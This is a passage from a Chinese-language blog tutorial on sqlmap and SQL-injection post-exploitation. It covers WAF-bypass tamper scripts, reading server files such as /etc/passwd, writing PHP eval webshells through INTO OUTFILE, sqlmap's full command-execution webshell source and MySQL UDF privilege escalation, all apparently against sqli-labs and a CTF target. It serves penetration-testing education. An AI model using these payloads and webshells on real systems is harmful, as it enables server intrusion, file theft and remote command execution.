class="line">--random-agent        #任意的http头</span><br><span class="line">--tamper base64encode            #对提交的数据进行base64编码</span><br><span class="line">--referer http://www.baidu.com   #伪造referer字段</span><br><span class="line"> </span><br><span class="line">--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="绕WAF"><a href="#绕WAF" class="headerlink" title="绕WAF"></a>绕WAF</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>只用–tamper对参数进行修改来绕过waf，官方提供的绝大部分脚本是用正则模块替换攻击载荷字符编码的方式来绕过waf的检测规则。</p><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--identify-waf   检测是否有WAF</span><br><span class="line"> </span><br><span class="line">#使用参数进行绕过</span><br><span class="line">--random-agent    使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候</span><br><span class="line">--time-sec=3      使用长的延时来避免触发WAF的机制，这方式比较耗时</span><br><span class="line">--hpp             使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上</span><br><span class="line">--proxy=100.100.100.100:8080 --proxy-cred=211:985      使用代理进行绕过</span><br><span class="line">--ignore-proxy    禁止使用系统的代理，直接连接进行注入</span><br><span class="line">--flush-session   清空会话，重构注入</span><br><span class="line">--hex 或者 --no-cast     进行字符码转换</span><br><span class="line">--mobile          对移动端的服务器进行注入</span><br><span class="line">--tor             匿名注入</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sqlmap为我们准备了绕过waf的脚本，在sqlmap文件夹tamper文件夹下<br>使用情况如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用方法--tamper xxx.py</span><br><span class="line">apostrophemask.py用UTF-8全角字符替换单引号字符</span><br><span class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</span><br><span class="line">appendnullbyte.py在payload末尾添加空字符编码</span><br><span class="line">base64encode.py 对给定的payload全部字符使用Base64编码</span><br><span class="line">between.py分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</span><br><span class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</span><br><span class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span><br><span class="line">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</span><br><span class="line">equaltolike.py 用“LIKE”运算符替换全部等于号“=”</span><br><span class="line">greatest.py 用“GREATEST”函数替换大于号“&gt;”</span><br><span class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</span><br><span class="line">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</span><br><span class="line">lowercase.py 用小写值替换每个关键字字符</span><br><span class="line">modsecurityversioned.py 用注释包围完整的查询</span><br><span class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</span><br><span class="line">multiplespaces.py 在SQL关键字周围添加多个空格</span><br><span class="line">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</span><br><span class="line">overlongutf8.py 转换给定的payload当中的所有字符</span><br><span class="line">percentage.py 在每个字符之前添加一个百分号</span><br><span class="line">randomcase.py 随机转换每个关键字字符的大小写</span><br><span class="line">randomcomments.py 向SQL关键字中插入随机注释</span><br><span class="line">securesphere.py 添加经过特殊构造的字符串</span><br><span class="line">sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</span><br><span class="line">space2comment.py 用“/**/”替换空格符</span><br><span class="line">space2dash.py 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</span><br><span class="line">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mysqldash.py 用破折号注释符“--”其次是一个换行符替换空格符</span><br><span class="line">space2plus.py 用加号“+”替换空格符</span><br><span class="line">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</span><br><span class="line">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</span><br><span class="line">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</span><br><span class="line">versionedkeywords.py 用MySQL注释包围每个非函数关键字</span><br><span class="line">versionedmorekeywords.py 用MySQL注释包围每个关键字</span><br><span class="line">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="level-risk"><a href="#level-risk" class="headerlink" title="-level&#x2F;-risk"></a>-level&#x2F;-risk</h3><p>Sqlmap一共有5个探测等级,默认是1。等级越高，说明探测时使用的payload也越多。其中5级的payload最多 ，会自动破解出cookie、XFF等头部注入。当然,等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET和POST的数据都会进行测试,HTTP cookie在level为2时就会测试，HTTP User-Agent&#x2F;Referer头在level为3时就会测试。 在不确定哪个参数为注入点时，为为保证准确.性,建议设置level为5</p><p>Sqlmap一共有3个危险等级, 也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思， 在不确定的情况下，建议设置为3级，–risk&#x3D;3</p><p>工具使用payload目录<br>sqlmap\data\xml\payloads（windows）</p><p>伪造Http Referer头部<br>sqlmap可以在请求中伪造http请求头中的referer，当-level大于等于3时，会进行referer注入<br>eg: referer <code>http://www.topreverse.cn</code></p><h3 id="执行指定的SQL语句"><a href="#执行指定的SQL语句" class="headerlink" title="执行指定的SQL语句"></a>执行指定的SQL语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --sql-shell  #执行指定的sql语句</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605e43b6e.png" alt="image-20240309202957671"></p><h3 id="执行OS系统命令"><a href="#执行OS系统命令" class="headerlink" title="执行OS系统命令"></a>执行OS系统命令</h3><p>当且仅当数据库是mysql、postgresql、sql server时可以执行。<br>当数据库是mysql时，需要满足3个条件：<br>1、root权限<br>2、已经知道目标站点的绝对路径<br>3、secure_file_priv的参数值时空（未修改前是NULL）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --os-shell  #执行--os-shell命令</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605df3431.png" alt="image-20240309203114502"></p><p>过程中sqlmap会向指定路径传入两个文件，tmpblwkd.php（木马文件）和tmpueqch.php。退出时输入q和x才可以删除传入的文件。</p><h3 id="读取服务器文件"><a href="#读取服务器文件" class="headerlink" title="读取服务器文件"></a>读取服务器文件</h3><p>前提：数据库是：mysql、postgresql和sql server</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --file-read &quot;c:/topreverse.txt&quot; #读取目标服务器C盘下的test.txt文件</span><br></pre></td></tr></table></figure><p>上传文件到数据库服务器<br>前提：数据库是mysql、postgre sql、sql server</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-2/?id=1 --file-write C:\Users\system32\Desktop\text.php --file-dest &quot;C:\phpStudy\PHPTutorial\WWW\test.php&quot;  #将本地的text.php文件上传到目标服务器test.php</span><br></pre></td></tr></table></figure><p>sqlmap自身上传完成之后会进行验证，读取文件大小进行对比。</p><h1 id="SQL写马"><a href="#SQL写马" class="headerlink" title="SQL写马"></a>SQL写马</h1><h2 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><h4 id="1-此方法利用的先决条件"><a href="#1-此方法利用的先决条件" class="headerlink" title="1.此方法利用的先决条件"></a>1.此方法利用的先决条件</h4><ul><li><p>web目录具有写权限，能够使用单引号</p></li><li><p>知道网站绝对路径（根目录，或则是根目录往下的目录都行）</p></li><li><p>secure_file_priv没有具体值（在mysql&#x2F;my.ini中查看）</p></li><li><p>最好网站是root权限</p></li></ul><h4 id="2-secure-file-priv"><a href="#2-secure-file-priv" class="headerlink" title="2.secure_file_priv"></a>2.secure_file_priv</h4><p>secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。如下关于secure_file_priv的配置介绍</p><p><code>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</code></p><p>所以如果我们要想使用into outfile函数写入一句话的话就需要将secure_file_priv 的值设为没有值，那如何设置了？修改secure_file_priv 的值只能通过手动打开配置文件进行修改，不能直接使用sql语句进行修改</p><p>（1）看secure-file-priv参数的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p>如下，secure_file_priv 的值默认为NULL，则表示限制mysqld 不允许导入|导出</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b1980f.png" alt="image-20240309213850241"></p><p>（2）修改secure_file_priv 的值</p><p>我们可以在mysql&#x2F;my.ini中查看是否有secure_file_priv 的参数，如果没有的话我们就添加 secure_file_priv &#x3D; ‘’ 即可</p><p><img src="https://bu.dusays.com/2024/05/13/6641605abbc58.png" alt="image-20240309213819001"></p><p>此时再查看secure_file_priv的值如下已经变为空了</p><p><img src="https://bu.dusays.com/2024/05/13/6641605a6d4e7.png" alt="image-20240309213241536"></p><p>设置完成后我们就可以利用这个函数来写入一句话木马</p><p><strong>outfile还有一个”兄弟”时dumpfile</strong> </p><p>两者的区别是dumpfile只能导出一行，而outfile支持多行，dumpfile保留数据的原始格式未进行转义，而outfile会对数据进行转义</p><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>我们以sqli-labs第七关为例</p><h4 id="1-注入点判断"><a href="#1-注入点判断" class="headerlink" title="1.注入点判断"></a>1.注入点判断</h4><p>输入正确的语法正常显示，错误的语法显示说语法错误，页面只存在两种状态，判断为盲注。我们输入?id&#x3D;3’)) and sleep(5) –+时成功延时，所以注入点就为3’))，我们输入的字符被包含在单引号中，且单引号外有两个双引号包裹</p><p><img src="https://bu.dusays.com/2024/05/13/6641605cc6295.png" alt="image-20240309212953403"></p><h4 id="2-判断列数"><a href="#2-判断列数" class="headerlink" title="2.判断列数"></a>2.判断列数</h4><p>我们使用order by 语句判断列数，order by 3时，正常显示，4时不正常，判断为3列</p><p><img src="https://bu.dusays.com/2024/05/13/6641605ce5806.png" alt="image-20240309212923779"></p><h4 id="3-写入webshell"><a href="#3-写入webshell" class="headerlink" title="3.写入webshell"></a>3.写入webshell</h4><p>加如此前我们已经通过一些方法获取到了网站的根目录，则可以写入一句话 “ <code>&lt;?php eval($_REQUEST[1]);?&gt; </code>”。一句话建议进行十六进制转码（不用编码也可以） </p><p><img src="https://bu.dusays.com/2024/05/13/6641605abe0b1.png" alt="image-20240309212843043"></p><p>编码后，然后在最前面加上 0x。如下我们将一句话木马进行十六进制编码后写入了根目录下的outfile.php文件中</p><p><code>http://106.15.50.112:8023/?r=content&amp;cid=-1%20and(1)UNION SELECT 1,2,3,4,5,6,7,8,9,10,&lt;?php @eval($_REQUEST[&#39;aaa&#39;]);?&gt;,12,13 into outfile &quot;/var/www/html/aaa.php&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-3&#x27;)) union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile &#x27;C:\\Users\\Administrator.WIN2012\\Desktop\\ph</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605e15d6c.png" alt="image-20240309212821210"></p><p>成功写入，<strong>这里网站的目录要使用双斜杠</strong>不然会写不进去，第一个斜杠是转义的意思，字符串解析不仅仅局限于C编译器，Java编译器、一些配置文件的解析、Web服务器等等，都会遇到对字符串进行解析的这个问题，由于传统的 Windows采用的是单个斜杠的路径分隔形式，导致在对文件路径进行解析的时候可能发生不必要的错误，所以就出现了用双反斜杠”\“分隔路径的形式。 不管解析引擎是否将反斜杠解析成转义字符，最终在内存中得到的都是”&quot;，结果也就不会出问题了。</p><p><img src="https://bu.dusays.com/2024/05/13/6641605ae93b5.png" alt="image-20240309212740673"></p><h4 id="4-连接webshell"><a href="#4-连接webshell" class="headerlink" title="4.连接webshell"></a>4.连接webshell</h4><p>成功连接</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b91e13.png" alt="image-20240309212708078"></p><p>如果我们将 secure_file_priv的值为设置为null，我们在进行上面的写入操作发现并没有写进去。</p><p><img src="https://bu.dusays.com/2024/05/13/6641605ac4c04.png" alt="image-20240309212649362"></p><p>所以没有写进去的情况有两种：</p><ul><li>网站的路径不对，或者没有使用双斜杠进行转义</li><li>secure_file_priv的值不是为空</li></ul><h2 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>–os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件</p><p>此为sqlmap的一个命令，利用这条命令的先决条件：</p><p>要求为数据库DBA，使用–is-dba查看当前网站连接的数据库账号是否为mysql user表中的管理员如root，是则为dba<br>secure_file_priv没有具体值<br>知道网站的绝对路径</p><h3 id="使用-5"><a href="#使用-5" class="headerlink" title="使用"></a>使用</h3><p>我们以sqli-labs第一关为例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.43.145/2_Shotting_Range/sql/Less-1/?id=1 --os-shell</span><br></pre></td></tr></table></figure><p>这里需要我们选择网站的脚本语言，和网站根路径</p><p>[1] common location(s) (‘C:&#x2F;xampp&#x2F;htdocs&#x2F;, C:&#x2F;wamp&#x2F;www&#x2F;, C:&#x2F;Inetpub&#x2F;wwwroot&#x2F;‘) (default) #sqlmap自带测试常规路径<br>[2] custom location(s) #自己填写绝对路径<br>[3] custom directory list file #自己填写目录字典，我们将字典所在的路径传过去就行<br>[4] brute force search #爆破路径</p><p><img src="https://bu.dusays.com/2024/05/13/6641605e0acb5.png" alt="image-20240309212513030"></p><p>sqlmap在指定的目录生成了两个文件（文件名是随机的，并不是固定的）：</p><p>tmpbeewq.php 用来执行系统命令<br>tmpuqvgw.php 用来上传文件</p><p><img src="https://bu.dusays.com/2024/05/13/6641605abcf3b.png" alt="image-20240310123947689"></p><p><img src="https://bu.dusays.com/2024/05/13/6641605d631d1.png" alt="image-20240309212253989"></p><ol><li>tmpbeewq.php的文件内容为</li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$c</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);@<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>,<span class="number">0</span>);<span class="variable">$z</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>);<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$z</span>))&#123;<span class="variable">$z</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[, ]+/&quot;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);<span class="variable">$z</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);<span class="variable">$z</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&quot;trim&quot;</span>,<span class="variable">$z</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$z</span>=<span class="keyword">array</span>();&#125;<span class="variable">$c</span>=<span class="variable">$c</span>.<span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;<span class="keyword">global</span> <span class="variable">$z</span>;<span class="keyword">return</span> <span class="title function_ invoke__">is_callable</span>(<span class="variable">$n</span>)<span class="keyword">and</span>!<span class="title function_ invoke__">in_array</span>(<span class="variable">$n</span>,<span class="variable">$z</span>);&#125;<span class="keyword">if</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;system&quot;</span>))&#123;<span class="title function_ invoke__">ob_start</span>();<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);<span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;proc_open&quot;</span>))&#123;<span class="variable">$y</span>=<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),<span class="variable">$t</span>);<span class="variable">$w</span>=<span class="literal">NULL</span>;<span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$t</span>[<span class="number">1</span>]))&#123;<span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$t</span>[<span class="number">1</span>],<span class="number">512</span>);&#125;@<span class="title function_ invoke__">proc_close</span>(<span class="variable">$y</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;shell_exec&quot;</span>))&#123;<span class="variable">$w</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;passthru&quot;</span>))&#123;<span class="title function_ invoke__">ob_start</span>();<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);<span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;popen&quot;</span>))&#123;<span class="variable">$x</span>=<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,r);<span class="variable">$w</span>=<span class="literal">NULL</span>;<span class="keyword">if</span>(<span class="title function_ invoke__">is_resource</span>(<span class="variable">$x</span>))&#123;<span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$x</span>))&#123;<span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>,<span class="number">512</span>);&#125;&#125;@<span class="title function_ invoke__">pclose</span>(<span class="variable">$x</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;exec&quot;</span>))&#123;<span class="variable">$w</span>=<span class="keyword">array</span>();<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$w</span>);<span class="variable">$w</span>=<span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>),<span class="variable">$w</span>).<span class="title function_ invoke__">chr</span>(<span class="number">10</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$w</span>=<span class="number">0</span>;&#125;<span class="keyword">echo</span><span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问一下</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b8678b.png" alt="image-20240309212158771"></p><ol start="2"><li>使用tmpuqvgw.php上传文件</li></ol><p>我们上传一个php的一句话后门</p><p><img src="https://bu.dusays.com/2024/05/13/6641605c9578c.png" alt="image-20240309212059564"></p><p>访问</p><p><img src="https://bu.dusays.com/2024/05/13/6641605d2de48.png" alt="image-20240309212338071"></p><p><strong>所以这两种方式都需要知道网站的绝对路径才行。</strong></p><p>补充：</p><p>上面说了sqlmap写入webshell的方式有三种，缺一不可</p><ul><li>web目录具有写权限，能够使用单引号</li><li>知道网站绝对路径</li><li>secure_file_priv没有具体值（在mysql&#x2F;my.ini中查看）</li></ul><h2 id="如何寻找web文件路径"><a href="#如何寻找web文件路径" class="headerlink" title="如何寻找web文件路径"></a>如何寻找web文件路径</h2><p>web应用的位置默认都在**&#x2F;var&#x2F;www&#x2F;html&#x2F;，<strong>我们一般网页的文件都是在这上面，但是如果开发者设计的话可以在</strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;** 后修改网页文件存放位置。</p><h3 id="利用mysql的函数"><a href="#利用mysql的函数" class="headerlink" title="利用mysql的函数"></a>利用mysql的函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://106.15.50.112:8023/?r=content&amp;cid=15&#x27; --dbms &quot;mysql&quot;  --file-read &quot;/etc/passwd&quot; --technique U</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605b6b76b.png" alt="image-20240309215148900"></p><p> 当然 sqlmap得到得信息不会显示出来，而是会在保存在sqlmap的文件夹中。</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b6ea6c.png" alt="image-20240309215429365"></p><p> 找到文件位置，打开文件（注意是  .local   有个 “.” 需要注意）</p><p><img src="https://bu.dusays.com/2024/05/13/6641605cdfbf8.png" alt="image-20240309215307860"></p><p><img src="https://bu.dusays.com/2024/05/13/6641605d7e868.png" alt="image-20240309215451151"></p><p> 没有关键信息，我们再查看其他的配置文件（这种文件名，一般情况都是默认）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://106.15.50.112:8023/?r=content&amp;cid=15&#x27; --dbms &quot;mysql&quot;  --file-read &quot;/etc/init.d/httpd&quot; --technique U</span><br></pre></td></tr></table></figure><p>得到关键config文件的路径</p><p><img src="https://bu.dusays.com/2024/05/13/6641605c966bf.png" alt="image-20240309215530002"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://106.15.50.112:8023/?r=content&amp;cid=15&#x27; --dbms &quot;mysql&quot;  --file-read &quot;/etc/httpd/conf/httpd.conf&quot; --technique U</span><br></pre></td></tr></table></figure><p>找到的web文件放置的路径，这就是我们要上传木马的路径</p><p><img src="https://bu.dusays.com/2024/05/13/6641605c97a1f.png" alt="image-20240309215547389"></p><p> 接下来手动用sqlmap 写马都可以，这里选的是手动</p><p>写马POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://106.15.50.112:8023/?r=content&amp;cid=-1%20and(1)UNION SELECT 1,2,3,4,5,6,7,8,9,10,&lt;?php @eval($_REQUEST[&#x27;aaa&#x27;]);?&gt;,12,13 into outfile &quot;/var/www/html/whalwl/aaa.php&quot;</span><br></pre></td></tr></table></figure><p>继续检测</p><p><img src="https://bu.dusays.com/2024/05/13/6641605ba3e3b.png" alt="image-20240309220011003"></p><p> 这里又失败了，为什么了呢？，又涉及到经验问题了，服务器一般不会给web根目录写文件的权限（实际上能sql注入写马的条件比较苛刻），不过我们可以继续寻找子文件夹，看是否能上传。</p><p>下面也不啰嗦了，发现，直接是能上传到 image 目录下，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://106.15.50.112:8023/?r=content&amp;cid=-1%20and(1)UNION SELECT 1,2,3,4,5,6,7,8,9,10,&quot;&lt;?php @eval($_REQUEST[&#x27;aaa&#x27;]);?&gt;&quot;,12,13 into outfile &quot;/var/www/html/whalwl/images/aaa.php&quot;</span><br></pre></td></tr></table></figure><p> shell管理工具连接</p><p><img src="https://bu.dusays.com/2024/05/13/6641605c791fd.png" alt="image-20240309220056634"></p><p> 看到flag<br><img src="https://bu.dusays.com/2024/05/13/6641605deedfe.png" alt="image-20240309220112713"></p><h3 id="–sql-shell"><a href="#–sql-shell" class="headerlink" title="–sql-shell"></a>–sql-shell</h3><p>我们可以先使用这个来执行一些sql语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;xxx&quot; --sql-shell</span><br></pre></td></tr></table></figure><p>查看文件路径（mysql&#x2F;data的路径，根目录一般与mysql处于同一目录）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@datadir;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605cf2308.png" alt="image-20240309211749043"></p><p>查看secure_file_priv的值是否为空</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv </span><br></pre></td></tr></table></figure><p>如下为null，无法写入</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b3bf4b.png" alt="image-20240309211650715"></p><p>当为空的时候则什么都不返回</p><p><img src="https://bu.dusays.com/2024/05/13/6641605c297d1.png" alt="image-20240309211636404"></p><h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><p>1.phpinfo()</p><p>2.随便传入参数 报错 可能有相关信息</p><p>3.指纹信息收集</p><p><img src="https://bu.dusays.com/2024/05/13/6641605daaac3.png" alt="image-20240310122613276"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在实际上我们用木马连接后，权限可能很小</p><p>详细如下：<a href="https://www.freebuf.com/articles/network/268221.html">提权详解</a></p><p>这里采用UDF提权的方法</p><p><strong>这里的udf提权是应用程序或服务提权</strong></p><p><a href="https://www.freebuf.com/articles/web/283566.html">UDF提权详解</a></p><p>udf 全称为：user defined function，意为<strong>用户自定义函数</strong>；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。</p><p><strong>提权步骤</strong></p><blockquote><p>1.把含有自定义函数(如执行系统调用函数“sys_eval”)的dll文件(如linux为so文件等)放入特定文件夹下</p><p>2.声明引用这个dll文件中的自定义函数</p><p>3.使用这个自定义的函数系统调用完成提权</p></blockquote><p>udf 文件后缀一般为 dll，由C、C++编写</p><blockquote><p>先到sqlmap上找到udf文件，要注意到这个文件的后缀是so_,不是so ，所以还需要编译一下，具体原因请仔细看上方链接。</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641605c14b31.png" alt="image-20240309220935476"></p><p>利用 cloak.py 给 udf文件解码</p><p><img src="https://bu.dusays.com/2024/05/13/6641605bbb1ee.png" alt="image-20240309220959335"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cloak.py -d -i  lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure><p>修改名称为aaa.so</p><p>上传这个文件同样需要路径，这里又要引入一个新概念</p><p><strong>plugin</strong></p><p>plugin是插件的意思,通常是用与对某个现有的架构进行扩展。</p><p>我们把这个udf文件放入到plugin文件才能真正产生作用。</p><p>实施</p><blockquote><ol><li>找到数据库名称，密码</li><li>查找plugin路径</li><li>上传udf文件</li><li>执行系统命令</li></ol></blockquote><p>首先在配置文件找到了数据库登陆信息</p><p><img src="https://bu.dusays.com/2024/05/13/6641605dd1fc9.png" alt="image-20240309221220889"></p><p>登陆数据库，查找plugin路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605cb9e55.png" alt="image-20240309221258584"></p><p> 在该路径把udf文件上传，aaa.so</p><p><img src="https://bu.dusays.com/2024/05/13/6641605ea17da.png" alt="image-20240309221329629"></p><p> 之后在数据库输入命令，执行提权文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname &#x27;aaa.so&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605ccef80.png" alt="image-20240309221355888"></p><p>命令执行打开flag</p><p><img src="https://bu.dusays.com/2024/05/13/6641605cb5970.png" alt="image-20240309221424676"></p><blockquote><p>如果MySQL版本大于5.1，udf.dll文件必须放置在MySQL安装目录的lib\plugin文件夹下才可以创建自定义函数。该目录默认是不存在的，需要使用WebShall找到MySQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录。</p><p>如果MySQL版本小于5.1,udf.dll文件在Windows Server 2003 下放置在C:\Windows\system32目录中</p></blockquote><h2 id="日志马"><a href="#日志马" class="headerlink" title="日志马"></a>日志马</h2><h3 id="全局日志写马"><a href="#全局日志写马" class="headerlink" title="全局日志写马"></a>全局日志写马</h3><p>我们所有的数据库的都有一个存放日志的文件，这个文件可以会进行记录数据库的操作语句，也可能不会记录数据库的操作语句，这却决于两个全局变量：</p><p><code>general_log</code>&#x3D;&#x3D;&gt;日志保存状态，有两个状态，ON代表开启 